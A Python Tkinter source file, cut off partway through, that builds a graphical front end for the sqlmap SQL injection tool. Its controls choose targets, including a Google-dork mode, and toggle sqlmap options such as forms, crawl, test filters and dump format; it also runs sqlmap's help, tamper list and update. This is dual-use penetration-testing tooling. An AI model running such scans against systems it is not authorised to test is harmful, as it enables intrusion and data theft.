#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""gui for SQLmap"""

import os
import re
import subprocess
import tkinter
import tkinter.filedialog
import tkinter.font
import tkinter.ttk
from tkinter import ttk, font
import urllib.parse


# -----------------------------------------
# SQLmap Update
# -----------------------------------------
def update_i_t():
    if os.name == "posix":
        os.system("gnome-terminal -- /bin/bash -c \"python3 sqlmap.py --update ; exec bash\"")
    else:
        os.system(u'start cmd /k python sqlmap.py --update')


# ------------------------------------------
# CopyPasteCut
# ------------------------------------------
def r_clicker(e):
    try:
        def r_click__copy(e, apnd=0):
            e.widget.event_generate('<Control-c>')

        def r_click__cut(e):
            e.widget.event_generate('<Control-x>')

        def r_click_paste(e):
            e.widget.event_generate('<Control-v>')

        e.widget.focus()
        nclst = [
            (' Cut', lambda e=e: r_click__cut(e)),
            (' Copy', lambda e=e: r_click__copy(e)),
            (' Paste', lambda e=e: r_click_paste(e)),
        ]
        rmenu = tkinter.Menu(None, tearoff=0, takefocus=0)

        for (txt, cmd) in nclst:
            rmenu.add_command(label=txt, command=cmd)

        rmenu.tk_popup(e.x_root + 40, e.y_root + 10, entry="0")
    except tkinter.TclError:
        pass
    return "break"


def r_clicking(self):
    try:
        for b in ['Text', 'Entry', 'Listbox', 'Label']:
            self.bind_class(b, sequence='<Button-3>', func=r_clicker, add='')
    except tkinter.TclError:
        pass


class MainApplication(tkinter.Frame):
    def __init__(self, mw):
        tkinter.Frame.__init__(self, mw)
        self.grid(sticky='nswe')
        # Hot Keys: ######################################
        mw.bind('<F1>', self.help__f1)
        mw.bind('<Alt-Key-s>', self.alt_key_s)
        mw.bind('<Alt-Key-l>', self.alt_key_l)
        mw.bind('<Alt-Key-e>', self.alt_key_e)
        mw.bind('<F2>', self.commands)
        mw.bind('<Shift-Key-F2>', self.inject_it)
        mw.bind('<Button-3>', r_clicker, add='')
        mw.bind('<Alt-Key-1>', self.alt_key_1)
        mw.bind('<Alt-Key-2>', self.alt_key_2)
        mw.bind('<Alt-Key-3>', self.alt_key_3)
        mw.bind('<Alt-Key-4>', self.alt_key_4)
        mw.bind('<Alt-Key-5>', self.alt_key_5)
        # ################################################
        self.rowconfigure(0, weight=1)
        self.columnconfigure(0, weight=1)
        self.nRoot = ttk.Notebook(self)
        builder_frame = ttk.Frame(self.nRoot)
        watch_log = ttk.Frame(self.nRoot)
        editor = ttk.Frame(self.nRoot)
        help_me = ttk.Frame(self.nRoot)
        update_sqlmap = ttk.Frame(self.nRoot)
        tampers_list = ttk.Frame(self.nRoot)

        self.nRoot.add(builder_frame, text='SQLmap Command Builder')
        self.nRoot.add(watch_log, text='Log viewer')
        self.nRoot.add(editor, text='Editor')
        self.nRoot.add(help_me, text='Help!')
        self.nRoot.rowconfigure(0, weight=1)
        self.nRoot.columnconfigure(0, weight=1)
        self.nRoot.grid(row=0, column=0, sticky='nswe', ipady=3, ipadx=3)
        self.nRoot.add(tampers_list, text='Tampers List')
        self.nRoot.rowconfigure(0, weight=1)
        self.nRoot.columnconfigure(0, weight=1)
        self.nRoot.grid(row=0, column=0, sticky='nswe', ipady=3, ipadx=3)
        self.nRoot.add(update_sqlmap, text='Update Sqlmap')
        self.nRoot.columnconfigure(0, weight=1)
        self.nRoot.grid(row=0, column=0, sticky='nswe', ipady=3, ipadx=3)
        builder_frame.rowconfigure(0, weight=1)
        builder_frame.columnconfigure(0, weight=1)
        editor.rowconfigure(0, weight=1)
        editor.columnconfigure(0, weight=1)
        help_me.rowconfigure(0, weight=1)
        help_me.columnconfigure(0, weight=1)
        tampers_list.rowconfigure(0, weight=1)
        tampers_list.columnconfigure(0, weight=1)
        update_sqlmap.rowconfigure(0, weight=1)
        update_sqlmap.columnconfigure(0, weight=1)
        # Help SqlMAP
        lfhelp = ttk.Labelframe(help_me)
        lfhelp.grid(sticky='nswe')
        scrol_help = ttk.Scrollbar(lfhelp)
        scrol_help.grid(row=0, column=1, sticky='ns')
        lfhelp.rowconfigure(0, weight=1)
        lfhelp.columnconfigure(0, weight=1)

        manual_sqlmap = 'python3 sqlmap.py -hh || cmd /k python sqlmap.py -hh || pythonw sqlmap.py -hh'
        process = subprocess.Popen(manual_sqlmap, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        help_t_x_t = tkinter.Text(lfhelp, yscrollcommand=scrol_help.set, width=73,
                                  height=24, bg='#002B36', fg='#93A1A1')
        help_t_x_t.insert('1.0', process.communicate()[0])
        scrol_help.config(command=help_t_x_t.yview)
        help_t_x_t.grid(row=0, column=0, ipadx=30, sticky='nswe')
        # Tampers List
        tmprs_lst = ttk.Labelframe(tampers_list)
        tmprs_lst.grid(sticky='nswe')
        scrol_tampers = ttk.Scrollbar(tmprs_lst)
        scrol_tampers.grid(row=0, column=1, sticky='ns')
        tmprs_lst.rowconfigure(0, weight=1)
        tmprs_lst.columnconfigure(0, weight=1)

        manual_tampers_command = 'python3 sqlmap.py --list-tampers || cmd /k python sqlmap.py --list-tampers ' \
                                 '|| pythonw sqlmap.py --list-tampers'
        process = subprocess.Popen(manual_tampers_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        tampers_txt = tkinter.Text(tmprs_lst, yscrollcommand=scrol_tampers.set, width=73,
                                   height=24, bg='#002B36', fg='#93A1A1')
        tampers_txt.insert('1.0', process.communicate()[0])
        scrol_tampers.config(command=tampers_txt.yview)
        tampers_txt.grid(row=0, column=0, ipadx=30, sticky='nswe')
        # Update Sqlmap
        rupdate = ttk.Labelframe(update_sqlmap, text='')
        rupdate.grid(row=0, column=0, sticky='nswe')
        rupdate.columnconfigure(0, weight=1)
        rupdate.rowconfigure(0, weight=1)
        # Start Update Button
        but = ttk.Button(update_sqlmap)
        but.config(text="start update", width=15, command=update_i_t)
        but.grid(row=3, column=0, sticky='nw')
        # EDITOR
        request_l_f = ttk.Labelframe(editor, text='')
        request_l_f.grid(row=0, column=0, sticky='nswe')
        request_l_f.columnconfigure(0, weight=1)
        request_l_f.rowconfigure(0, weight=1)
        # Open
        # Button Panel
        rout_panel = ttk.Labelframe(editor, text='')
        rout_panel.grid(row=1, sticky='we', columnspan=2)
        r_open = ttk.Button(rout_panel, width=15)
        r_open.config(text="openReqFile", command=self.open_req_f)
        r_open.grid(row=1, column=0, sticky='w')
        c_open = ttk.Button(rout_panel, width=15)
        c_open.config(text="openConfFile", command=self.open_ini_f)
        c_open.grid(row=1, column=1, sticky='w')
        r_save = ttk.Button(rout_panel, width=15)
        r_save.config(text="saveReqFile", command=self.save_req_f)
        r_save.grid(row=1, column=2, sticky='w')
        c_save = ttk.Button(rout_panel, width=15)
        c_save.config(text="saveConfFile", command=self.save_ini_f)
        c_save.grid(row=1, column=3, sticky='w')
        self.file_request_save = save_request = {}
        save_request['defaultextension'] = '.txt'
        save_request['filetypes'] = [('all files', '.*')]
        save_request['initialdir'] = './SQM/REQUEST/'
        save_request['parent'] = editor
        save_request['title'] = 'HTTP Requet FILE'
        self.file_ini = open_ini = {}
        open_ini['defaultextension'] = '.conf'
        open_ini['filetypes'] = [('all files', '.conf')]
        open_ini['initialdir'] = './SQM/CONFIGFILE/'
        open_ini['parent'] = editor
        open_ini['title'] = 'CONFIGFILE'
        #
        req_file_scr = ttk.Scrollbar(request_l_f)
        req_file_scr.grid(row=0, column=1, sticky='ns', columnspan=10)
        self.reqFile = tkinter.Text(request_l_f, yscrollcommand=req_file_scr.set, undo=True, height=29, bg='#002B36',
                                    fg='#93A1A1')
        req_file_scr.config(command=self.reqFile.yview)
        self.reqFile.grid(row=0, column=0, sticky='nswe')
        self.reqFile.columnconfigure(0, weight=1)
        self.reqFile.rowconfigure(0, weight=1)
        # Load Log...
        lf_watch_log = ttk.Labelframe(watch_log, text='')
        watch_log.rowconfigure(0, weight=1)
        watch_log.columnconfigure(0, weight=1)
        lf_watch_log.grid(row=0, column=0, sticky='nswe', columnspan=10)
        lf_watch_log.rowconfigure(0, weight=1)
        lf_watch_log.columnconfigure(0, weight=1)
        #
        scrol_ses = ttk.Scrollbar(lf_watch_log)
        scrol_ses.grid(row=0, column=1, sticky='ns')
        #
        self.sesTXT = tkinter.Text(lf_watch_log, yscrollcommand=scrol_ses.set, width=73,
                                   height=22, bg='#002B36', fg='#93A1A1')
        scrol_ses.config(command=self.sesTXT.yview)
        self.sesTXT.grid(row=0, column=0, ipadx=30, sticky='nswe')
        self.sesTXT.bind('<F3>', self.on_find)
        self.sesTXT.bind('<F4>', self.on_find_all)
        # Button Panel
        but_panel = ttk.Labelframe(watch_log, text='')
        but_panel.grid(row=1, sticky='we', columnspan=2)
        logbut = ttk.Button(but_panel, width=3)
        logbut.config(text="log", command=self.logs)
        logbut.grid(row=1, column=5, sticky='e')
        # full log
        self.chkLog = ttk.Checkbutton(but_panel)
        self.chkLog_var = tkinter.StringVar()
        self.chkLog.config(text="full log", variable=self.chkLog_var, onvalue="on",
                           offvalue="off")  # , command= self.chekLog)
        self.chkLog.grid(row=1, column=4, sticky='e', padx=10)
        #
        sesbut = ttk.Button(but_panel, width=10)
        sesbut.config(text="session", command=self.session)
        sesbut.grid(row=1, column=3, sticky='ws', ipadx=3)
        #
        self.search_var = tkinter.StringVar()
        self.searchEdit = ttk.Entry(but_panel, width=30)
        self.searchEdit.config(text="", textvariable=self.search_var)
        self.searchEdit.grid(row=1, column=0, sticky='w', padx=3)
        self.search_var.set('HotKey: F3-find, F4-find all')
        self.searchEdit.bind('<F3>', self.on_find)
        self.searchEdit.bind('<F4>', self.on_find_all)
        self.sesTXT.bind('<Alt_L><r>', self.logs)
        #
        ses_fbut = ttk.Button(but_panel, width=15)
        ses_fbut.config(text="open session", command=self.f_open_session_file)
        ses_fbut.grid(row=1, column=6, sticky='ws', ipadx=3)
        self.file_session = options_session = {}
        options_session['defaultextension'] = ''
        options_session['initialdir'] = './SESSION/'
        options_session['parent'] = watch_log
        options_session['title'] = 'Open Session FILE'
        #
        trafbut = ttk.Button(but_panel, width=15)
        trafbut.config(text="open traffic", command=self.f_traffic_file)
        trafbut.grid(row=1, column=7, sticky='ws')
        self.file_traf = options_traf = {}
        options_traf['defaultextension'] = ''
        options_traf['initialdir'] = './TRAFFIC/'
        options_traf['parent'] = watch_log
        options_traf['title'] = 'Open Traffic FILE'
        #
        paned_url = ttk.Panedwindow(builder_frame, orient=tkinter.VERTICAL)
        paned_url.columnconfigure(0, weight=1)
        paned_url.rowconfigure(0, weight=1)
        # TARGETS:
        target_variant = ttk.Labelframe(paned_url, text='')
        target_variant.columnconfigure(0, weight=1)
        paned_url.add(target_variant)
        #
        url_lf = ttk.Labelframe(paned_url, text='target:')
        url_lf.columnconfigure(0, weight=1)
        url_lf.columnconfigure(0, weight=1)
        paned_url.add(url_lf)
        #
        self.varTarget = tkinter.StringVar()
        rb_url = ttk.Radiobutton(target_variant, text='url', variable=self.varTarget, value="url",
                                 command=self.f_target)
        rb_log = ttk.Radiobutton(target_variant, text='logFile', variable=self.varTarget, value="logFile",
                                 command=self.f_target)
        rb_bulk_file = ttk.Radiobutton(target_variant, text='bulkFile', variable=self.varTarget, value="bulkFile",
                                       command=self.f_target)
        rb_request = ttk.Radiobutton(target_variant, text='requestFile', variable=self.varTarget,
                                     value="requestFile",
                                     command=self.f_target)
        rb_dork = ttk.Radiobutton(target_variant, text='googleDork', variable=self.varTarget, value="googleDork",
                                  command=self.f_target)
        rb_direct = ttk.Radiobutton(target_variant, text='direct', variable=self.varTarget, value="direct",
                                    command=self.f_target)
        rb_config = ttk.Radiobutton(target_variant, text='configFile', variable=self.varTarget, value="configFile",
                                    command=self.f_target)
        rb_sitemapurl = ttk.Radiobutton(target_variant, text='sitemapurl', variable=self.varTarget, value="sitemapurl",
                                        command=self.f_target)
        rb_url.grid(row=0, column=0, sticky='w')
        rb_log.grid(row=0, column=1, sticky='w')
        rb_bulk_file.grid(row=0, column=2, sticky='w')
        rb_request.grid(row=0, column=3, sticky='w')
        rb_dork.grid(row=0, column=4, sticky='w')
        rb_direct.grid(row=0, column=5, sticky='w')
        rb_config.grid(row=0, column=6, sticky='w')
        rb_sitemapurl.grid(row=0, column=7, sticky='w')

        self.urlentry = ttk.Combobox(url_lf)
        self.urlentry.grid(row=1, column=0, sticky='we')

        # query to sqlmap
        query_l_f = ttk.Labelframe(paned_url, text='query to sqlmap:')
        query_l_f.columnconfigure(0, weight=1)
        query_l_f.rowconfigure(0, weight=1)
        paned_url.add(query_l_f)
        self.sql_var = tkinter.StringVar()
        self.sqlEdit = ttk.Entry(query_l_f)
        self.sqlEdit.config(text="", textvariable=self.sql_var)
        self.sqlEdit.grid(sticky='we')
        self.sqlEdit.columnconfigure(0, weight=1)
        paned_url.grid(row=0, column=0, sticky='nwe', rowspan=2)
        self.noBF = ttk.Notebook(builder_frame)
        settings_f = ttk.Frame(self.noBF)
        s_det_tech_f = ttk.Frame(self.noBF)
        request_f = ttk.Frame(self.noBF)
        enumeration_f = ttk.Frame(self.noBF)
        api_f = ttk.Frame(self.noBF)
        file_f = ttk.Frame(self.noBF)
        self.noBF.add(settings_f, text='Settings')
        self.noBF.add(s_det_tech_f, text='Injection | Detection | Technique')
        self.noBF.add(request_f, text='Request')
        self.noBF.add(enumeration_f, text='Enumeration')
        self.noBF.add(file_f, text='Access')
        self.noBF.add(api_f, text='Api')
        self.noBF.columnconfigure(0, weight=1)
        self.noBF.grid(sticky='nswe', padx=3, pady=3)
        self.noBF.select(tab_id=1)

        settings_f.columnconfigure(0, weight=1)
        s_det_tech_f.columnconfigure(0, weight=1)
        request_f.columnconfigure(0, weight=1)
        file_f.columnconfigure(0, weight=1)
        api_f.columnconfigure(0, weight=1)
        # take query SqlMAP
        but = ttk.Button(builder_frame)
        but.config(text="get query", width=10, command=self.commands)
        #
        but.grid(row=3, column=0, sticky='nw')
        #
        but_inj = ttk.Button(builder_frame)
        but_inj.config(text="start", width=10, command=self.inject_it)
        but_inj.grid(row=3, column=0, sticky='ne')
        # GENERAL
        gen_opt_lf = ttk.Labelframe(settings_f, text='General')
        gen_opt_lf.grid(row=2, sticky='we', columnspan=2, pady=10)
        # --forms             Parse and test forms on target url
        self.chk_forms = ttk.Checkbutton(gen_opt_lf)
        self.chk_forms_var = tkinter.StringVar()
        self.chk_forms.config(text="forms", variable=self.chk_forms_var, onvalue="on",
                              offvalue="off", command=self.f_forms)
        self.chk_forms.grid(row=0, column=0, sticky='w')
        # --fresh-queries     Ignores query results stored in session file
        self.chk_fresh = ttk.Checkbutton(gen_opt_lf)
        self.chk_fresh_var = tkinter.StringVar()
        self.chk_fresh.config(text="fresh-queries", variable=self.chk_fresh_var, onvalue="on",
                              offvalue="off", command=self.f_fresh)
        self.chk_fresh.grid(row=1, column=0, sticky='w', ipadx=3)
        # --parse-errors      Parse and display DBMS error messages from responses
        self.chk_parse_errors = ttk.Checkbutton(gen_opt_lf)
        self.chk_parse_errors_var = tkinter.StringVar()
        self.chk_parse_errors.config(text="parse-errors", variable=self.chk_parse_errors_var, onvalue="on",
                                     offvalue="off", command=self.chk_parse_errors)
        self.chk_parse_errors.grid(row=2, column=0, sticky='w')
        # --repair            Redump entries having unknown character marker (?)
        self.chk_repair = ttk.Checkbutton(gen_opt_lf)
        self.chk_repair_var = tkinter.StringVar()
        self.chk_repair.config(text="repair", variable=self.chk_repair_var, onvalue="on",
                               offvalue="off", command=self.f_repair)
        self.chk_repair.grid(row=3, column=0, sticky='w')
        # --flush-session     Flush session file for current target
        self.chk_flush = ttk.Checkbutton(gen_opt_lf)
        self.chk_flush_var = tkinter.StringVar()
        self.chk_flush.config(text="flush-session", variable=self.chk_flush_var, onvalue="on",
                              offvalue="off", command=self.f_flush)
        self.chk_flush.grid(row=0, column=1, sticky='w', ipadx=3)
        # --hex               Use DBMS hex function(s) for data retrieval
        self.chk_hex = ttk.Checkbutton(gen_opt_lf)
        self.chk_hex_var = tkinter.StringVar()
        self.chk_hex.config(text="hex", variable=self.chk_hex_var, onvalue="on",
                            offvalue="off", command=self.f_hex)
        self.chk_hex.grid(row=1, column=1, sticky='w')
        # --eta               Display for each output the estimated time of arrival
        self.chk_eta = ttk.Checkbutton(gen_opt_lf)
        self.chk_eta_var = tkinter.StringVar()
        self.chk_eta.config(text="eta", variable=self.chk_eta_var, onvalue="on",
                            offvalue="off", command=self.f_eta)
        self.chk_eta.grid(row=2, column=1, sticky='w')
        # --batch             Never ask for user input, use the default behaviour
        self.chk_batch = ttk.Checkbutton(gen_opt_lf)
        self.chk_batch_var = tkinter.StringVar()
        self.chk_batch.config(text="batch", variable=self.chk_batch_var, onvalue="on",
                              offvalue="off", command=self.f_batch)
        self.chk_batch.grid(row=4, column=0, sticky='w', ipadx=3)
        # --no-logging          Stop logging
        self.chk_no_logging = ttk.Checkbutton(gen_opt_lf)
        self.chk_no_logging_var = tkinter.StringVar()
        self.chk_no_logging.config(text="no-logging", variable=self.chk_no_logging_var, onvalue="on",
                                   offvalue="off", command=self.f_no_logging)
        self.chk_no_logging.grid(row=4, column=1, sticky='w', ipadx=3)
        # --crawl=CRAWLDEPTH  Crawl the website starting from the target url
        self.chk_crawl = ttk.Checkbutton(gen_opt_lf)
        self.chkCrawl_var = tkinter.StringVar()
        self.chk_crawl.config(text="crawl", variable=self.chkCrawl_var, onvalue="on",
                              offvalue="off", command=self.f_crawl)
        self.chk_crawl.grid(row=1, column=2, sticky='w')
        #
        self.e_crawl = ttk.Combobox(gen_opt_lf)
        self.e_crawl_value = tkinter.StringVar()
        self.e_crawl.config(textvariable=self.e_crawl_value, state='disabled', width=3)
        self.e_crawl['values'] = ('1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '50', '100')
        self.e_crawl.current(0)
        self.e_crawl.bind('<<ComboboxSelected>>', self.f_crawl)
        self.e_crawl.grid(row=1, column=3, sticky='w', padx=3)
        # --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
        self.chk_crawl_exclude = ttk.Checkbutton(gen_opt_lf)
        self.chk_crawl_exclude_var = tkinter.StringVar()
        self.chk_crawl_exclude.config(text="crawl-exclude", variable=self.chk_crawl_exclude_var, onvalue="on",
                                      offvalue="off", command=self.f_crawl_exclude)
        self.chk_crawl_exclude.grid(row=2, column=2, sticky='w')
        #
        self.e_crawl_exclude = ttk.Combobox(gen_opt_lf)
        self.e_crawl_exclude_value = tkinter.StringVar()
        self.e_crawl_exclude.config(textvariable=self.e_crawl_exclude_value, state='disabled', width=3)
        self.e_crawl_exclude['values'] = ('logout')
        self.e_crawl_exclude.current(0)
        self.e_crawl_exclude.bind('<<ComboboxSelected>>', self.f_crawl_exclude)
        self.e_crawl_exclude.grid(row=2, column=3, sticky='w', padx=3)
        # --charset=CHARSET   Force character encoding used for data retrieval
        self.chk_charset = ttk.Checkbutton(gen_opt_lf)
        self.chk_charset_var = tkinter.StringVar()
        self.chk_charset.config(text="charset", variable=self.chk_charset_var, onvalue="on",
                                offvalue="off", command=self.f_charset)
        self.chk_charset.grid(row=0, column=4, sticky='w')
        #
        self.e_charset = ttk.Combobox(gen_opt_lf)
        self.e_charset_value = tkinter.StringVar()
        self.e_charset.config(textvariable=self.e_charset_value, state='disabled', width=7)
        self.e_charset['values'] = ('ISO-8859-1', 'ISO-8859-15', 'Big5', 'GBK', 'GB18030', 'UTF-32', 'UTF-8', 'UTF-16',
                                    'UTF-7', 'KOI8-U', 'KOI8-R', 'windows-1251', 'unicodeFFFE')
        self.e_charset.current(0)
        self.e_charset.bind('<<ComboboxSelected>>', self.f_charset)
        self.e_charset.grid(row=0, column=5, sticky='w', padx=3)
        # --check-internet    Check Internet connection before assesing the target
        self.chk_internet_connect = ttk.Checkbutton(gen_opt_lf)
        self.chk_internet_connect_var = tkinter.StringVar()
        self.chk_internet_connect.config(text="check-internet", variable=self.chk_internet_connect_var, onvalue="on",
                                         offvalue="off", command=self.f_check_connect)
        self.chk_internet_connect.grid(row=3, column=1, sticky='w')
        # --binary-fields=..  Result fields having binary values (e.g. "digest")
        self.chk_binary_fields = ttk.Checkbutton(gen_opt_lf)
        self.chk_binary_fields_var = tkinter.StringVar()
        self.chk_binary_fields.config(text="binary-fields", variable=self.chk_binary_fields_var, onvalue="on",
                                      offvalue="off", command=self.f_binary_fields)
        self.chk_binary_fields.grid(row=2, column=4, sticky='w')
        #
        self.e_binary_fields = ttk.Combobox(gen_opt_lf)
        self.e_binary_fields_value = tkinter.StringVar()
        self.e_binary_fields.config(textvariable=self.e_binary_fields_value, state='disabled', width=7)
        self.e_binary_fields['values'] = ('digest')
        self.e_binary_fields.current(0)
        self.e_binary_fields.bind('<<ComboboxSelected>>', self.f_binary_fields)
        self.e_binary_fields.grid(row=2, column=5, sticky='w', padx=3)
        # --dump-format=DUMPFORMAT  Format of dumped data (CSV (default), HTML or SQLITE)
        self.chk_dump_format = ttk.Checkbutton(gen_opt_lf)
        self.chk_dump_format_var = tkinter.StringVar()
        self.chk_dump_format.config(text="dump-format", variable=self.chk_dump_format_var, onvalue="on",
                                    offvalue="off", command=self.f_dump_format)
        self.chk_dump_format.grid(row=0, column=6, sticky='w')
        #
        self.e_dump_format = ttk.Combobox(gen_opt_lf)
        self.e_dump_format_value = tkinter.StringVar()
        self.e_dump_format.config(textvariable=self.e_dump_format_value, state='disabled', width=7)
        self.e_dump_format['values'] = ('CSV', 'HTML', 'SQLITE')
        self.e_dump_format.current(0)
        self.e_dump_format.bind('<<ComboboxSelected>>', self.f_dump_format)
        self.e_dump_format.grid(row=0, column=7, sticky='we', padx=3)
        # --encoding=GBK     Character encoding used for data retrieval (e.g. GBK)
        self.chk_encoding = ttk.Checkbutton(gen_opt_lf)
        self.chk_encoding_var = tkinter.StringVar()
        self.chk_encoding.config(text="encoding", variable=self.chk_encoding_var, onvalue="on",
                                 offvalue="off", command=self.f_encoding)

        self.chk_encoding.grid(row=1, column=4, sticky='w')
        #
        self.encoding = ttk.Combobox(gen_opt_lf)
        self.encoding_value = tkinter.StringVar()
        self.encoding.config(textvariable=self.encoding_value, state='disabled', width=7)
        self.encoding['values'] = ('GBK', 'ISO-8859-1', 'ISO-8859-15', 'Big5', 'GB18030', 'UTF-32', 'UTF-8', 'UTF-16',
                                   'UTF-7', 'KOI8-U', 'KOI8-R', 'windows-1251', 'unicodeFFFE')
        self.encoding.current(0)
        self.encoding.bind('<<ComboboxSelected>>', self.f_encoding)
        self.encoding.grid(row=1, column=5, sticky='we', padx=3)
        # --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
        self.chk_csv_del = ttk.Checkbutton(gen_opt_lf)
        self.chk_csv_del_var = tkinter.StringVar()
        self.chk_csv_del.config(text="csv-del", variable=self.chk_csv_del_var, onvalue="on",
                                offvalue="off", command=self.f_csv_del)
        self.chk_csv_del.grid(row=3, column=4, sticky='w')
        #
        self.e_csv_del = ttk.Combobox(gen_opt_lf)
        self.e_csv_del_value = tkinter.StringVar()
        self.e_csv_del.config(textvariable=self.e_csv_del_value, state='disabled', width=7)
        self.e_csv_del['values'] = (',', '.')
        self.e_csv_del.current(0)
        self.e_csv_del.bind('<<ComboboxSelected>>', self.f_csv_del)
        self.e_csv_del.grid(row=3, column=5, sticky='w', padx=3)
        # --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
        self.chk_table_prefix = ttk.Checkbutton(gen_opt_lf)
        self.chk_table_prefix_var = tkinter.StringVar()
        self.chk_table_prefix.config(text="table-prefix", variable=self.chk_table_prefix_var, onvalue="on",
                                     offvalue="off", command=self.f_table_prefix)
        self.chk_table_prefix.grid(row=0, column=2, sticky='w')
        #
        self.e_table_prefix = ttk.Combobox(gen_opt_lf)
        self.e_table_prefix_value = tkinter.StringVar()
        self.e_table_prefix.config(textvariable=self.e_table_prefix_value, state='disabled', width=3)
        self.e_table_prefix['values'] = 'foobar'
        self.e_table_prefix.current(0)
        self.e_table_prefix.bind('<<ComboboxSelected>>', self.f_table_prefix)
        self.e_table_prefix.grid(row=0, column=3, sticky='w', padx=3)
        # LABELFRAME START SESSIONFILE
        gen_file_lf = ttk.Labelframe(gen_opt_lf, text='')
        gen_file_lf.grid(row=5, sticky='we', columnspan=10, rowspan=3)
        # --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
        self.chk_test_filter = ttk.Checkbutton(gen_opt_lf)
        self.chk_test_filter_var = tkinter.StringVar()
        self.chk_test_filter.config(text="test-filter", variable=self.chk_test_filter_var, onvalue="on",
                                    offvalue="off", command=self.f_test_filter)
        self.chk_test_filter.grid(row=2, column=6, sticky='w')
        #
        self.e_test_filter = ttk.Combobox(gen_opt_lf)
        self.e_test_filter_value = tkinter.StringVar()
        self.e_test_filter.config(textvariable=self.e_test_filter_value, state='disabled', width=7)
        self.e_test_filter['values'] = ('ORDER BY', 'GROUP BY', 'NULL', 'HAVING', 'EXEC')
        self.e_test_filter.current(0)
        self.e_test_filter.bind('<<ComboboxSelected>>', self.f_test_filter)
        self.e_test_filter.grid(row=2, column=7, sticky='w', padx=3)
        # --preprocess        Use given script(s) for preprocessing of response data
        self.chk_preprocess = ttk.Checkbutton(gen_opt_lf)
        self.chk_preprocess_var = tkinter.StringVar()
        self.chk_preprocess.config(text="preprocess", variable=self.chk_preprocess_var, onvalue="on",
                                   offvalue="off", command=self.f_pre_process)
        self.chk_preprocess.grid(row=3, column=6, sticky='w')
        #
        self.e_preprocess_var = tkinter.StringVar()
        self.e_preprocess = ttk.Entry(gen_opt_lf, width=7)
        self.e_preprocess.config(text="", textvariable=self.e_preprocess_var)
        self.e_preprocess.grid(row=3, column=7, sticky='w')
        self.e_preprocess.columnconfigure(0, weight=1)
        # --postprocess        Use given script(s) for postprocessing of response data
        self.chk_post_process = ttk.Checkbutton(gen_opt_lf)
        self.chk_post_process_var = tkinter.StringVar()
        self.chk_post_process.config(text="postprocess", variable=self.chk_post_process_var, onvalue="on",
                                     offvalue="off", command=self.f_post_process)
        self.chk_post_process.grid(row=4, column=6, sticky='w')
        #
        self.e_post_process_var = tkinter.StringVar()
        self.e_post_process = ttk.Entry(gen_opt_lf, width=7)
        self.e_post_process.config(text="", textvariable=self.e_post_process_var)
        self.e_post_process.grid(row=4, column=7,  sticky='w')
        self.e_post_process.columnconfigure(0, weight=1)
        # --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
        self.chk_test_skip = ttk.Checkbutton(gen_opt_lf)
        self.chk_test_skip_var = tkinter.StringVar()
        self.chk_test_skip.config(text="test-skip", variable=self.chk_test_skip_var, onvalue="on",
                                  offvalue="off", command=self.f_test_skip)
        self.chk_test_skip.grid(row=1, column=6, sticky='w')
        #
        self.e_test_skip = ttk.Combobox(gen_opt_lf)
        self.e_test_skip_value = tkinter.StringVar()
        self.e_test_skip.config(textvariable=self.e_test_skip_value, state='disabled', width=7)
        self.e_test_skip['values'] = ('BENCHMARK', 'CHAR', 'NULL')
        self.e_test_skip.current(0)
        self.e_test_skip.bind('<<ComboboxSelected>>', self.f_test_skip)
        self.e_test_skip.grid(row=1, column=7, sticky='w', padx=3)
        # --disable-precon      Disable preconnection of sqlmap (check for 200 answer - may abuse some WAFs)
        self.chk_disable_precon = ttk.Checkbutton(gen_opt_lf)
        self.chk_disable_precon_var = tkinter.StringVar()
        self.chk_disable_precon.config(text="disable-precon", variable=self.chk_disable_precon_var, onvalue="on",
                                       offvalue="off", command=self.f_disable_precon)
        self.chk_disable_precon.grid(row=3, column=2, sticky='w')
        # --dump-file=DUMP.. Store dumped data to a custom file
        self.chk_dump_file = ttk.Checkbutton(gen_opt_lf)
        self.chk_dump_file_var = tkinter.StringVar()
        self.chk_dump_file.config(text="dump-file", variable=self.chk_dump_file_var, onvalue="on",
                                  offvalue="off", command=self.f_dump_file)
        self.chk_dump_file.grid(row=4, column=2, sticky='w')
        #
        self.e_dump_file_var = tkinter.StringVar()
        self.e_dump_file = ttk.Entry(gen_opt_lf, width=7)
        self.e_dump_file.config(text="", textvariable=self.e_dump_file_var)
        self.e_dump_file.grid(row=4, column=3, sticky='we')
        # -s SESSIONFILE      Save and resume all data retrieved on a session file
        self.chk_session_file = ttk.Checkbutton(gen_file_lf)
        self.chk_session_file_var = tkinter.StringVar()
        self.chk_session_file.config(text="s SESSIONFILE", variable=self.chk_session_file_var, onvalue="on",
                                     offvalue="off", command=self.f_session_file)
        self.chk_session_file.grid(row=4, column=0, sticky='w', ipadx=15)
        #
        self.e_session_file_var = tkinter.StringVar()
        self.e_session_file = ttk.Entry(gen_file_lf, width=20)
        self.e_session_file.config(text="", textvariable=self.e_session_file_var)
        self.e_session_file.grid(row=4, column=1, sticky='we')
        # -t TRAFFICFILE      Log all HTTP traffic into a textual file
        self.chk_traffic_file = ttk.Checkbutton(gen_file_lf)
        self.chk_read_traffic_file_var = tkinter.StringVar()
        self.chk_traffic_file.config(text="t TRAFFICFILE", variable=self.chk_read_traffic_file_var, onvalue="on",
                                     offvalue="off", command=self.f_read_traffic_file)
        self.chk_traffic_file.grid(row=4, column=2, sticky='w', ipadx=15)

        self.e_traffic_file_var = tkinter.StringVar()
        self.e_traffic_file = ttk.Entry(gen_file_lf, width=20)
        self.e_traffic_file.config(text="", textvariable=self.e_traffic_file_var)
        self.e_traffic_file.grid(row=4, column=3, sticky='we')
        # --output-dir=OUT..  Custom output directory path
        self.chk_output_dir = ttk.Checkbutton(gen_file_lf)
        self.chk_output_dir_var = tkinter.StringVar()
        self.chk_output_dir.config(text="output-dir", variable=self.chk_output_dir_var, onvalue="on",
                                   offvalue="off", command=self.f_output_dir)
        self.chk_output_dir.grid(row=5, column=0, sticky='w', ipadx=15)
        #
        self.e_output_dir_var = tkinter.StringVar()
        self.e_output_dir = ttk.Entry(gen_file_lf, width=20)
        self.e_output_dir.config(text="", textvariable=self.e_output_dir_var)
